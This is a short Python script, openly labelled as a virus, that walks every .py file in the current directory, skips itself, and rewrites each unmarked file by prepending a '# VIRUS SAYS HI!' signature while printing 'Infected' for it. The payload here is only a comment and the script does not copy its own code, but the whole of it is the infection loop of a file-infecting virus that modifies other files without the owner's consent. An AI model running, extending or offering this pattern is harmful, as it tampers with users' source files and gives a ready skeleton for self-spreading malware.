import glob
import os

# The virus signature
virus_header = "# VIRUS SAYS HI!\n"

# Get all python files in the current directory
python_files = glob.glob("*.py")

for file in python_files:
    if file == "virus_script.py":
        continue
    
    with open(file, 'r') as f:
        content = f.read()
    
    # Check if already infecteds
    if not content.startswith(virus_header):
        with open(file, 'w') as f:
            f.write(virus_header + content)
            print(f"Infected: {file}")

print("Virus execution complete.")